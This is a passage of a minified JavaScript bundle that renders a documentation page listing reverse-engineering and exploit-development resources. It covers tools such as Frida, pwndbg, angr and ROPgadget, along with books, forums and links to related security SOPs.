development"}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Windows Internals Blog"})," - ",(0,i.jsx)(n.a,{href:"https://www.windows-internals.com/blog/",children:"windows-internals.com/blog"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Windows kernel and internals research"}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Phrack Magazine"})," - ",(0,i.jsx)(n.a,{href:"http://phrack.org/",children:"phrack.org"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Classic hacking/exploitation zine (historical techniques)"}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"debugging--dynamic-analysis",children:"Debugging & Dynamic Analysis"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Frida Documentation"})," - ",(0,i.jsx)(n.a,{href:"https://frida.re/docs/",children:"frida.re/docs"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Official Frida dynamic instrumentation guide"}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Pin Documentation"})," - ",(0,i.jsx)(n.a,{href:"https://software.intel.com/content/www/us/en/develop/articles/pin-a-dynamic-binary-instrumentation-tool.html",children:"intel.com/content/www/us/en/developer/articles/tool/pin-a-dynamic-binary-instrumentation-tool.html"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Intel Pin instrumentation framework"}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"GDB Cheat Sheet"})," - ",(0,i.jsx)(n.a,{href:"https://darkdust.net/files/GDB%20Cheat%20Sheet.pdf",children:"darkdust.net/files/GDB%20Cheat%20Sheet.pdf"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Quick GDB command reference"}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"pwndbg Documentation"})," - ",(0,i.jsx)(n.a,{href:"https://github.com/pwndbg/pwndbg",children:"github.com/pwndbg/pwndbg"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"GDB enhancement for exploit development"}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"GEF Documentation"})," - ",(0,i.jsx)(n.a,{href:"https://hugsy.github.io/gef/",children:"hugsy.github.io/gef"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"GDB Enhanced Features guide"}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"binary-analysis-tools",children:"Binary Analysis Tools"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Binary Refinery"})," - ",(0,i.jsx)(n.a,{href:"https://github.com/binref/refinery",children:"github.com/binref/refinery"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Python-based binary analysis toolkit with 100+ tools"}),"\n",(0,i.jsx)(n.li,{children:"Data extraction, deobfuscation, format parsing"}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"angr Documentation"})," - ",(0,i.jsx)(n.a,{href:"https://docs.angr.io/",children:"docs.angr.io"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Binary analysis framework (symbolic execution, CFG recovery)"}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Triton"})," - ",(0,i.jsx)(n.a,{href:"https://triton.quarkslab.com/",children:"triton.quarkslab.com"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Dynamic symbolic execution framework"}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Unicorn Engine"})," - ",(0,i.jsx)(n.a,{href:"https://www.unicorn-engine.org/",children:"unicorn-engine.org"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Lightweight CPU emulator for RE"}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"platform-specific-resources",children:"Platform-Specific Resources"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Windows:"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Windows Internals (Book Series)"})," by Mark Russinovich"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Undocumented Windows Functions"})," - ",(0,i.jsx)(n.a,{href:"http://undocumented.ntinternals.net/",children:"undocumented.ntinternals.net"})]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"WinAPI Index"})," - ",(0,i.jsx)(n.a,{href:"https://docs.microsoft.com/en-us/windows/win32/api/",children:"docs.microsoft.com/en-us/windows/win32/api"})]}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Linux:"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Linux Syscall Reference"})," - ",(0,i.jsx)(n.a,{href:"https://man7.org/linux/man-pages/man2/syscalls.2.html",children:"man7.org/linux/man-pages/man2/syscalls.2.html"})]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Linux Kernel Documentation"})," - ",(0,i.jsx)(n.a,{href:"https://www.kernel.org/doc/",children:"kernel.org/doc"})]}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:".NET:"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"dnSpy"})," - ",(0,i.jsx)(n.a,{href:"https://github.com/dnSpy/dnSpy",children:"github.com/dnSpy/dnSpy"})]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:".NET Deobfuscation Guide"})," - ",(0,i.jsx)(n.a,{href:"https://github.com/NotPrab/.NET-Obfuscator",children:"github.com/NotPrab/.NET-Obfuscator"})]}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Android:"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"JADX"})," - ",(0,i.jsx)(n.a,{href:"https://github.com/skylot/jadx",children:"github.com/skylot/jadx"})]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Frida for Android"})," - ",(0,i.jsx)(n.a,{href:"https://frida.re/docs/android/",children:"frida.re/docs/android"})]}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"pwntools--automation",children:"Pwntools & Automation"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"pwntools Documentation"})," - ",(0,i.jsx)(n.a,{href:"https://docs.pwntools.com/",children:"docs.pwntools.com"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Python exploit development framework"}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"ROPgadget"})," - ",(0,i.jsx)(n.a,{href:"https://github.com/JonathanSalwan/ROPgadget",children:"github.com/JonathanSalwan/ROPgadget"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"ROP gadget finder"}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"ropper"})," - ",(0,i.jsx)(n.a,{href:"https://github.com/sashs/Ropper",children:"github.com/sashs/Ropper"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Advanced ROP gadget finder with semantic search"}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"one_gadget"})," - ",(0,i.jsx)(n.a,{href:"https://github.com/david942j/one_gadget",children:"github.com/david942j/one_gadget"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Find one-shot RCE gadgets in libc"}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"books--courses",children:"Books & Courses"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Practical Reverse Engineering"})," by Bruce Dang et al."]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"The IDA Pro Book"})," by Chris Eagle"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Reversing: Secrets of Reverse Engineering"})," by Eldad Eilam"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"The Art of Software Security Assessment"})," by Mark Dowd et al."]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Hacking: The Art of Exploitation"})," by Jon Erickson"]}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.strong,{children:"SANS FOR610: Reverse-Engineering Malware"})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.strong,{children:"SANS FOR710: Reverse Engineering Malware Advanced"})}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"RPISEC Modern Binary Exploitation (MBE)"})," - ",(0,i.jsx)(n.a,{href:"https://github.com/RPISEC/MBE",children:"github.com/RPISEC/MBE"})]}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"community--forums",children:"Community & Forums"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Reddit r/ReverseEngineering"})," - ",(0,i.jsx)(n.a,{href:"https://www.reddit.com/r/ReverseEngineering/",children:"reddit.com/r/ReverseEngineering"})]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"OpenRCE"})," - ",(0,i.jsx)(n.a,{href:"http://www.openrce.org/",children:"openrce.org"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Reverse engineering community (historical, less active now)"}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Tuts4You"})," - ",(0,i.jsx)(n.a,{href:"https://tuts4you.com/",children:"tuts4you.com"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Cracking/reversing tutorials and forums"}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"OSDev Wiki"})," - ",(0,i.jsx)(n.a,{href:"https://wiki.osdev.org/",children:"osdev.org"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"OS development and low-level programming"}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Related SOPs:"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Analysis:"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.a,{href:"../../Security/Analysis/sop-malware-analysis",children:"Malware Analysis"})," - Comprehensive malware reverse engineering and behavioral analysis"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.a,{href:"../../Security/Analysis/sop-cryptography-analysis",children:"Cryptography Analysis"})," - Analyzing encryption and cryptographic implementations"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.a,{href:"../../Security/Analysis/sop-hash-generation-methods",children:"Hash Generation Methods"})," - File integrity and hash analysis techniques"]}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Pentesting & Security:"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.a,{href:"../../Security/Pentesting/sop-linux-pentest",children:"Linux Pentesting"})," - Linux exploitation and privilege escalation"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.a,{href:"../../Security/Pentesting/sop-ad-pentest",children:"Active Directory Pentesting"})," - Windows AD security assessment"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.a,{href:"../../Security/Pentesting/sop-web-application-security",children:"Web Application Security"})," - Web app vulnerability assessment"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.a,{href:"../../Security/Pentesting/sop-mobile-security",children:"Mobile Security"})," - Android/iOS security testing"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.a,{href:"../../Security/Pentesting/sop-firmware-reverse-engineering",children:"Firmware Reverse Engineering"})," - IoT and embedded device analysis"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.a,{href:"../../Security/Pentesting/sop-vulnerability-research",children:"Vulnerability Research"})," - Finding and analyzing security flaws"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.a,{href:"../../Security/Pentesting/sop-bug-bounty",children:"Bug Bounty Hunting"})," - Responsible vulnerability disclosure"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.a,{href:"../../Security/Pentesting/sop-detection-evasion-testing",children:"Detection Evasion Testing"})," - Bypassing security controls"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.a,{href:"../../Pentesting/sop-forensics-investigation",children:"Forensics Investigation"})," - Digital forensics and incident response"]}),"\n"]})]})}function h(e={}){const{wrapper:n}={...(0,l.R)(),...e.components};return n?(0,i.jsx)(n,{...e,children:(0,i.jsx)(o,{...e})}):o(e)}}}]);